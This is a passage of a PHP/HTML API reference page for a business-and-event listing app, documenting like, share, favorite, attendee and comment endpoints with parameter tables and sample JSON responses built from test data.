class="hoverable"><span class="property">Lattitude</span>: <span class="type-string">"46.21"</span>,</div></li><li><div class="hoverable"><span class="property">Longitude</span>: <span class="type-string">"75.63"</span>,</div></li><li><div class="hoverable"><span class="property">datetime</span>: <span class="type-string">"2016-12-03 14:02"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">is_user_exits</span>: <span class="type-boolean">true</span>,</div></li><li><div class="hoverable"><span class="property">CreatedUserData</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"kalpesh1@vros.com"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Kalpesh1"</span>,</div></li><li><div class="hoverable"><span class="property">is_like</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png">http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">is_rated</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">""</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">medias</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/43/2df90bd67e2ed777610f5947f3c3561d.mp4">http://localhost/businessApp/uploads/business/43/2df90bd67e2ed777610f5947f3c3561d.mp4</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"v"</span>,</div></li><li><div class="hoverable"><span class="property">is_default</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">media_id</span>: <span class="type-string">"38"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/business/43/66f796355f8e58fd545799d6853774b0.mp4">http://localhost/businessApp/uploads/business/43/66f796355f8e58fd545799d6853774b0.mp4</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"v"</span>,</div></li><li><div class="hoverable"><span class="property">is_default</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">media_id</span>: <span class="type-string">"39"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">CategoryData</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Ads_subscription_data</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Offer_subscription_data</span>: [ ]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"test"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"test"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"Bakrol Bujrang, Gujarat 382433India"</span>,</div></li><li><div class="hoverable"><span class="property">address</span>: <span class="type-string">"limda chowk "</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"665.8423605214167"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/">http://localhost/businessApp/</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">totalshare</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">totalfavorite</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">category_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">since</span>: <span class="type-string">"2012"</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"123456"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"kalpesh1@vros.com"</span>,</div></li><li><div class="hoverable"><span class="property">Lattitude</span>: <span class="type-string">"41.87"</span>,</div></li><li><div class="hoverable"><span class="property">Longitude</span>: <span class="type-string">"87.62"</span>,</div></li><li><div class="hoverable"><span class="property">datetime</span>: <span class="type-string">"2016-12-01 10:19"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">"[{"day":"Sun","start":"20:15 PM","end":"20:15 PM","is_working":1},{"day":"Mon","start":"08:06 AM","end":"20:06 PM","is_working":1},{"day":"Tue","start":"08:06 AM","end":"20:06 PM","is_working":1},{"day":"Wed","start":"-","end":"-","is_working":0},{"day":"Thu","start":"-","end":"-","is_working":0},{"day":"Fri","start":"-","end":"-","is_working":0},{"day":"Sat","start":"-","end":"-","is_working":0}]"</span>,</div></li><li><div class="hoverable"><span class="property">is_user_exits</span>: <span class="type-boolean">true</span>,</div></li><li><div class="hoverable"><span class="property">CreatedUserData</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"kalpesh1@vros.com"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Kalpesh1"</span>,</div></li><li><div class="hoverable"><span class="property">is_like</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png">http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">is_rated</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">""</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">medias</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CategoryData</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Ads_subscription_data</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Offer_subscription_data</span>: [ ]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"31"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"test"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"dfdsf"</span>,</div></li><li><div class="hoverable"><span class="property">address</span>: <span class="type-string">"194, shimandhar gota
SG highway"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1565.506052161025"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/">http://localhost/businessApp/</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totallike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">totalshare</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">totalfavorite</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">category_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">since</span>: <span class="type-string">"3434"</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"9638433986"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"anjali.cmarix@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">Lattitude</span>: <span class="type-string">"23.72"</span>,</div></li><li><div class="hoverable"><span class="property">Longitude</span>: <span class="type-string">"72.23"</span>,</div></li><li><div class="hoverable"><span class="property">datetime</span>: <span class="type-string">"2016-12-01 13:45"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">"434"</span>,</div></li><li><div class="hoverable"><span class="property">is_user_exits</span>: <span class="type-boolean">true</span>,</div></li><li><div class="hoverable"><span class="property">CreatedUserData</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"kalpesh1@vros.com"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Kalpesh1"</span>,</div></li><li><div class="hoverable"><span class="property">is_like</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png">http://localhost/businessApp/user/1/d7620846fc11bcb0f6a3c2cf8caaaca0.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">is_rated</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">""</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">medias</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CategoryData</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Ads_subscription_data</span>: [ ],</div></li><li><div class="hoverable"><span class="property">Offer_subscription_data</span>: [ ]</div></li></ul>}</div></li></ul>]</div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<?php
include 'my_wishlists.php';
?>
<div class="section" id="eventLike">
    <h2>Like Event
        <a class="headerlink" href="index.php#eventLike" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'likeEvent.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Like Event Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'event/event_like';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>event_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>is_like</td>
                <td>Required</td>
                <td>(1=like and 0=dislike)</td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Thank you for Liked Event!"</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<div class="section" id="eventShare">
    <h2>Share Event
        <a class="headerlink" href="index.php#eventShare" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'eventShare.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Share Event Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'event/event_share';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>event_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>is_share</td>
                <td>Required</td>
                <td>(1=shared)</td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Thank you for sharing!."</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>
<?php
include 'share_event_with_friends.php';
?>

<div class="section" id="eventFavorite">
    <h2>Favorite Event
        <a class="headerlink" href="index.php#eventFavorite" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'eventFavorite.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Favorite Event Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'event/event_favorite';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>event_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>is_favourite</td>
                <td>Required</td>
                <td>(1=favorite and 0=removed from favorite)</td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Event Mark as your Favorite."</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<div class="section" id="eventAttendee">
    <h2>Add Event Attendee
        <a class="headerlink" href="index.php#eventAttendee" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'eventAttendee.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Favorite Event Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'event/add_event_attendee';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>event_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>touser_id</td>
                <td>Required</td>
                <td></td>
            </tr>
              <tr class="row-even">
                <td>invitation_status</td>
                <td>Required</td>
                <td>(0=Pending 1=Accept 2=Reject 3=May be)</td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Attendee Added Successfully."</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>



<div class="section" id="businessLike">
    <h2>Like Business
        <a class="headerlink" href="index.php#businessLike" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'likeBusiness.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Like Business Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'business/business_like';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>business_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>is_like</td>
                <td>Required</td>
                <td>(1=like and 0=dislike)</td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Thank you for Liked!"</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<div class="section" id="businessShare">
    <h2>Share Business
        <a class="headerlink" href="index.php#businessShare" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'businessShare.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Share Business Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'business/business_share';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>business_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>is_share</td>
                <td>Required</td>
                <td>(1=shared)</td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Thank you for sharing !"</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<?php
include 'share_business_with_friends.php';
?>
<div class="section" id="businessFavorite">
    <h2>Favorite Business
        <a class="headerlink" href="index.php#businessFavorite" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'businessFavorite.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Favorite Business Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'business/business_favorite';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>business_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>is_favourite</td>
                <td>Required</td>
                <td>(1=favorite and 0=removed from favorite)</td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Business Mark as your Favorite."</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>


<div class="section" id="businessComments">
    <h2>Post Business Comments
        <a class="headerlink" href="index.php#businessComments" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'businessComments.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Post Business Comments</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'business/post_comments';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>business_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>comment</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>rate</td>
                <td>optional</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Comment posted sucessfully."</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<div class="section" id="eventComments">
    <h2>Post Event Comments
        <a class="headerlink" href="index.php#eventComments" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'eventComments.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Post Event Comments</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'event/post_comments';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>event_id</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>comment</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>rate</td>
                <td>optional</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
